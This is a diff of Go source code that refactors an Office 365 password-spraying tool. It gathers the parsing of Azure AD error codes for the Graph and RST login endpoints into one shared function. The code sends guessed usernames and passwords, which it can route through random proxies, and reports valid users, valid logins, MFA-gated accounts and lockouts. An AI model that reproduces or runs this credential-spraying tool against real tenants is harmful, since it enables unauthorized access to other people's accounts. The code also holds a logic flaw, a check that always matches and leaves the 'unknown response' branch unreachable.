@@ -149,6 +149,54 @@ func randomProxy(proxies []string) string {
 	return proxy
 }
 
+// read response codes
+func parseResponse(xmlResponse string, un string, pw string, body []byte, endpoint string) (string, color.Attribute) {
+	var returnString string
+	var returnColor color.Attribute
+	// [graph] or [rst]
+	prefix := fmt.Sprintf("[%s] ", endpoint)
+
+	if strings.Contains(xmlResponse, "50059") {
+		fmt.Println(color.RedString(prefix + "[-] Domain not found in o365 directory. Exiting..."))
+		os.Exit(0) // no need to continue if the domain isn't found
+	} else if strings.Contains(xmlResponse, "50034") {
+		returnString = prefix + "[-] User not found: " + un
+		returnColor = color.FgRed
+	} else if strings.Contains(xmlResponse, "50126") {
+		returnString = prefix + "[-] Valid user, but invalid password: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(xmlResponse, "50055") {
+		returnString = prefix + "[!] Valid user, expired password: " + un + " : " + pw
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50056") {
+		returnString = prefix + "[!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(xmlResponse, "50053") {
+		returnString = prefix + "[-] Account locked out: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50057") {
+		returnString = prefix + "[-] Account disabled: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(xmlResponse, "50076") || strings.Contains(xmlResponse, "50079") {
+		returnString = prefix + "[+] Possible valid login, MFA required. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(xmlResponse, "53004") {
+		returnString = prefix + "[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(xmlResponse, "") {
+		returnString = prefix + "[+] Possible valid login! " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else {
+		returnString = prefix + "[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnColor = color.FgMagenta
+	}
+	if debug {
+		returnString = returnString + "\nDebug: " + string(body)
+	}
+
+	return returnString, returnColor
+}
+
 type flagVars struct {
 	flagHelp          bool
 	flagEndpoint      string
@@ -203,8 +251,6 @@ func flagOptions() *flagVars {
 	}
 }
 func doTheStuffGraph(un string, pw string, client *http.Client) (string, color.Attribute) {
-	var returnString string
-	var returnColor color.Attribute
 
 	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
 
@@ -236,48 +282,10 @@ func doTheStuffGraph(un string, pw string, client *http.Client) (string, color.A
 	jsonErrCode := data["error_codes"]
 	x := fmt.Sprintf("%v", jsonErrCode)
 
-	if strings.Contains(x, "50059") {
-		fmt.Println(color.RedString("[graph] [-] Domain not found in o365 directory. Exiting..."))
-		os.Exit(0) // no need to continue if the domain isn't found
-	} else if strings.Contains(x, "50034") {
-		returnString = "[graph] [-] User not found: " + un
-		returnColor = color.FgRed
-	} else if strings.Contains(x, "50126") {
-		returnString = "[graph] [-] Valid user, but invalid password: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x, "50055") {
-		returnString = "[graph] [!] Valid user, expired password: " + un + " : " + pw
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50056") {
-		returnString = "[graph] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x, "50053") {
-		returnString = "[graph] [-] Account locked out: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50057") {
-		returnString = "[graph] [-] Account disabled: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x, "50076") || strings.Contains(x, "50079") {
-		returnString = "[graph] [+] Possible valid login, MFA required. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x, "53004") {
-		returnString = "[graph] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x, "") {
-		returnString = "[graph] [+] Possible valid login! " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else {
-		returnString = "[graph] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
-		returnColor = color.FgMagenta
-	}
-	if debug {
-		returnString = returnString + "\nDebug: " + string(body)
-	}
-	return returnString, returnColor
+	return parseResponse(x, un, pw, body, "graph")
 }
 func doTheStuffRst(un string, pw string, client *http.Client) (string, color.Attribute) {
 	var returnString string
-	var returnColor color.Attribute
 	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
 
 	// Build http request
@@ -310,43 +318,10 @@ func doTheStuffRst(un string, pw string, client *http.Client) (string, color.Att
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
 		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
+		return returnString, color.FgGreen
 		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
-	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		// if the domain is not in the directory then exit
-		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
-		os.Exit(0) // no need to continue if the domain isn't found
-	} else if strings.Contains(x.Text(), "AADSTS50034") {
-		returnString = "[rst] [-] User not found: " + un
-		returnColor = color.FgRed
-	} else if strings.Contains(x.Text(), "AADSTS50126") {
-		returnString = "[rst] [-] Valid user, but invalid password: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x.Text(), "AADSTS50055") {
-		returnString = "[rst] [!] Valid user, expired password: " + un + " : " + pw
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50056") {
-		returnString = "[rst] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
-		returnColor = color.FgYellow
-	} else if strings.Contains(x.Text(), "AADSTS50053") {
-		returnString = "[rst] [-] Account locked out: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50057") {
-		returnString = "[rst] [-] Account disabled: " + un
-		returnColor = color.FgMagenta
-	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
-		returnString = "[rst] [+] Possible valid login, MFA required. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else if strings.Contains(x.Text(), "AADSTS53004") {
-		returnString = "[rst] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
-		returnColor = color.FgGreen
-	} else {
-		returnString = "[rst] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
-		returnColor = color.FgMagenta
 	}
-	if debug {
-		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
-	}
-	return returnString, returnColor
+	return parseResponse(x.Text(), un, pw, body, "rst")
 }
 func main() {
 	fmt.Println(color.BlueString(banner))
@@ -526,7 +501,6 @@ func main() {
 			if opt.flagUserPassFile != "" {
 				pass = passwordList[j]
 			}
-			// Handle http-proxy flag
 
 			// Setup the http.Client object
 			client := &http.Client{}
